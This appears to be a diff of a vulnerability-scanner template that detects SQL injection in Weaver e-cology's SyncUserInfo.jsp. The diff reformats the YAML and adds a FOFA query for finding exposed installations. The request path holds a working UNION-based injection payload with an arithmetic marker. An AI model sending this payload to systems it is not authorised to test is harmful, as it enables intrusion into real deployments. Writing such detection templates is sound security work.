@@ -1,5 +1,4 @@
 id: ecology-syncuserinfo-sqli
-
 info:
   name: Ecology Syncuserinfo - SQL Injection
   author: ritikchaddha
@@ -14,26 +13,23 @@ info:
     cwe-id: CWE-89
     cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
   metadata:
+    fofa-query: app="泛微-协同办公OA"
     max-request: 1
+    product: e-cology
     vendor: weaver
   tags: ecology,sqli,vuln
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null"
-
-    host-redirects: true
-    max-redirects: 2
-
-    matchers-condition: and
+  - host-redirects: true
     matchers:
-      - type: word
-        part: body
+      - part: body
+        type: word
         words:
           - "4386499557"
-
-      - type: status
-        status:
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    max-redirects: 2
+    method: GET
+    path:
+      - '{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null'
